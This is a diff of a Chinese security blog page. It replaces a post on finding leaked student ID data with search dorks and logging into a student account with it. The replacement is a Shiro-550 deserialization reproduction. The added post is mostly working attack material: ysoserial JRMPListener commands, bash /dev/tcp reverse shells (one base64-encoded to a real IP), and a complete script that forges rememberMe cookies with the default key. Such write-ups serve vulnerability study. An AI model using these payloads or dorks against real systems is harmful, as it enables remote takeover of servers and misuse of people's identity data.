@@ -3,36 +3,30 @@
 <html class="article-header-style-default">
 <head>
 	
-	<title>记一次从信息泄露到密码重置-挖掘思路 - 回梦&#39;s Blog</title>
+	<title>Shiro 550复现 - 回梦&#39;s Blog</title>
 	<meta charset="utf-8">
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta name="description" content="起因在挖EDUSRC的时候无意中点到的一个站点  当看到初始密码为8位生日的时候，立即想到了信息收集 信息收集思路12Site:xx.edu.cn filetype:xls 学号 身份证Site:xx.edu.cn xls 学号 身份证 假如xls文件没有，可以尝试搜索其他文件 如：doc、docx、xlsx、pdf、zip、7z等等 在一波搜索下，终于找到了一处信息泄露，搜索到的是一处xls文件">
+	<meta name="description" content="前言Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 影响版本Apache Shiro &lt;&#x3D; 1.2.4 漏洞原理Apache Shiro 1.2.4及以前版本中，Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cook">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次从信息泄露到密码重置-挖掘思路">
-<meta property="og:url" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:title" content="Shiro 550复现">
+<meta property="og:url" content="http://example.com/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="回梦&#39;s Blog">
-<meta property="og:description" content="起因在挖EDUSRC的时候无意中点到的一个站点  当看到初始密码为8位生日的时候，立即想到了信息收集 信息收集思路12Site:xx.edu.cn filetype:xls 学号 身份证Site:xx.edu.cn xls 学号 身份证 假如xls文件没有，可以尝试搜索其他文件 如：doc、docx、xlsx、pdf、zip、7z等等 在一波搜索下，终于找到了一处信息泄露，搜索到的是一处xls文件">
+<meta property="og:description" content="前言Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。 影响版本Apache Shiro &lt;&#x3D; 1.2.4 漏洞原理Apache Shiro 1.2.4及以前版本中，Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cook">
 <meta property="og:locale">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/1.png">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/2.png">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/3.png">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/4.png">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/5.png">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/6.png">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/7.png">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/8.png">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/9.png">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/10.png">
-<meta property="og:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/11.png">
-<meta property="article:published_time" content="2021-01-19T09:22:19.000Z">
-<meta property="article:modified_time" content="2021-01-19T09:49:50.944Z">
+<meta property="og:image" content="http://example.com/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/1.png">
+<meta property="og:image" content="http://example.com/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="og:image" content="http://example.com/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/4.png">
+<meta property="og:image" content="http://example.com/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="http://example.com/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/7.png">
+<meta property="og:image" content="http://example.com/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/8.png">
+<meta property="article:published_time" content="2020-08-19T10:06:17.000Z">
+<meta property="article:modified_time" content="2021-01-19T10:39:54.103Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="SRC">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/1.png">
+<meta name="twitter:image" content="http://example.com/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/1.png">
 
 	<meta name="theme-color" content="#00bfff">
 	<meta name="theme-color-rgb" content="0,191,255">
@@ -231,7 +225,7 @@
 							<ul class='navbar-nav navbar-nav-hover align-items-lg-center'>
 								
 										<li class='nav-item'>
-											<a href='/home' class='nav-link' >
+											<a href='/' class='nav-link' >
 												<i class='ni ni-book-bookmark d-lg-none'></i>
 												<span class='nav-link-inner--text'>首页</span>
 											</a>
@@ -310,7 +304,7 @@
 		
 			<div class="banner-title text-white"><span class="banner-title-inner">回梦</span>
 		
-		<span class="banner-subtitle d-block">但行好事，莫问前程</span></div>
+		</div>
 	</div>
 	
 		<style>
@@ -516,19 +510,19 @@
 							<nav class="site-state">
 								<div class="site-state-item site-state-posts">
 									<a href="/archives">
-										<span class="site-state-item-count">1</span>
+										<span class="site-state-item-count">6</span>
 										<span class="site-state-item-name">文章</span>
 									</a>
 								</div>
 								<div class="site-state-item site-state-categories">
 									<a data-toggle="modal" data-target="#blog_categories">
-										<span class="site-state-item-count">1</span>
+										<span class="site-state-item-count">3</span>
 										<span class="site-state-item-name">分类</span>
 									</a>
 								</div>      
 								<div class="site-state-item site-state-tags">
 									<a data-toggle="modal" data-target="#blog_tags">
-										<span class="site-state-item-count">2</span>
+										<span class="site-state-item-count">4</span>
 										<span class="site-state-item-name">标签</span>
 									</a>
 								</div>
@@ -562,7 +556,7 @@
 				</button>
 			</div>
 			<div class="modal-body">
-				<a class="badge badge-secondary tag" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试 <span class="tag-num">1</span></a>
+				<a class="badge badge-secondary tag" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试 <span class="tag-num">3</span></a><a class="badge badge-secondary tag" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现 <span class="tag-num">2</span></a>
 			</div>
 		</div>
 	</div>
@@ -577,7 +571,7 @@
 				</button>
 			</div>
 			<div class="modal-body">
-				<a class="badge badge-secondary tag" href="/tags/SRC/" rel="tag">SRC <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试 <span class="tag-num">1</span></a>
+				<a class="badge badge-secondary tag" href="/tags/SRC/" rel="tag">SRC <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E5%86%85%E7%BD%91%E6%B5%8B%E8%AF%95/" rel="tag">内网测试 <span class="tag-num">1</span></a><a class="badge badge-secondary tag" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试 <span class="tag-num">4</span></a><a class="badge badge-secondary tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现 <span class="tag-num">2</span></a>
 			</div>
 		</div>
 	</div>
@@ -591,13 +585,13 @@
 	<article class="post post-full card bg-white shadow-sm border-0 ">
 	<header class="post-header text-center">
 		
-		<a class="post-title" href="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/">记一次从信息泄露到密码重置-挖掘思路</a>
+		<a class="post-title" href="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/">Shiro 550复现</a>
 		<div class="post-meta">
 			
 						
 						<div class="post-meta-detail post-meta-detail-time">
 							<i class="fa fa-clock-o" aria-hidden="true"></i>
-							<time title="发布于 2021-1-19 17:22:19 | 编辑于 2021-1-19 17:49:50">2021-1-19 17:22
+							<time title="发布于 2020-8-19 18:06:17 | 编辑于 2021-1-19 18:39:54">2020-8-19 18:06
 							</time>
 						</div>
 					
@@ -606,7 +600,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-categories">
 							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
-							<a class="post-meta-detail-catagory-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+							<a class="post-meta-detail-catagory-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
 						</div>
 					
 						
@@ -624,7 +618,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-words">
 							<i class="fa fa-file-word-o" aria-hidden="true"></i>
-							129 字
+							692 字
 						</div>
 					
 						
@@ -632,7 +626,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-readingtime">
 							<i class="fa fa-hourglass-end" aria-hidden="true"></i>
-							1 分钟
+							3 分钟
 						</div>
 					
 		</div>
@@ -640,46 +634,39 @@
 	</header>
 
 	<div class="post-content" id="post_content">
-		<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在挖EDUSRC的时候无意中点到的一个站点</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+		<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
+<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p><strong>Apache Shiro &lt;= 1.2.4</strong></p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>Apache Shiro 1.2.4及以前版本中，Apache Shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值 &gt; Base64解码–&gt;AES解密–&gt;反序列化。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞</p>
+<h1 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h1><p>shiro反序列化的特征：在返回包的 Set-Cookie 中存在rememberMe=deleteMe 字段</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/1.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>当看到初始密码为8位生日的时候，立即想到了信息收集</p>
-<h1 id="信息收集思路"><a href="#信息收集思路" class="headerlink" title="信息收集思路"></a>信息收集思路</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Site:xx.edu.cn filetype:xls 学号 身份证</span><br><span class="line">Site:xx.edu.cn xls 学号 身份证</span><br></pre></td></tr></table></figure>
-<p>假如xls文件没有，可以尝试搜索其他文件</p>
-<p>如：doc、docx、xlsx、pdf、zip、7z等等</p>
-<p>在一波搜索下，终于找到了一处信息泄露，搜索到的是一处xls文件，带有学号和身份证等信息</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取docker镜像</span><br><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br><span class="line">启动docker镜像：</span><br><span class="line">docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>存在</strong> <strong>Set-Cookie</strong> <strong>利用</strong> <strong>Shiro_exploit</strong> <strong>脚本检测一下是否存在默认key</strong></p>
+<p><strong>python2 shiro.py -u <a target="_blank" rel="noopener" href="http://xxx.xxx.xxx.xxx/login.jsp">http://xxx.xxx.xxx.xxx/login.jsp</a></strong></p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>拿到了身份证和学号，当即去尝试登录。对头，还是初始密码，成功登录</p>
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>VPS监听:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>
+<p><strong>随后在vps，执行如下命令：（注意这里监听的端口为1099）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 <span class="string">&#x27;命令&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>这里的命令需要使用Java Runtime配置bash编码</strong></p>
+<p><strong>在线编码转换地址：<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></strong></p>
+<p><strong>转换命令如下：（这里是反弹shell的端口为1234）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/VPS公网ip/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/4.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>可以查看个人敏感信息和账号任意操作，在看个人资料的那里尝试找了一下越权漏洞发现没有，就辗转到了修改密码的地方</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/4.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p><strong>最终在VPS上执行的命令如下</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS45Ny4xMDAuMjcvMTIzNCAwPiYxCgo=&#125; | &#123;base64 -d&#125; | &#123;bash,-i&#125;</span></span><br></pre></td></tr></table></figure>
+<p>使用exp.py 生成Payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-0.0.5-SNAPSHOT-all.jar&#x27;</span>, <span class="string">&#x27;CommonsCollections2&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/payload.cookie&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">        print(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()), file=fpw)</span><br></pre></td></tr></table></figure>
+<p>把生成的payload复制下来，粘贴到cookie后面</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2020/08/19/Shiro-550%E5%A4%8D%E7%8E%B0/6.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<p>填好密码，抓了一下包看看</p>
-<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/01/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE-%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/5.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+<p>发包即可，查看VPS上的结果</p>
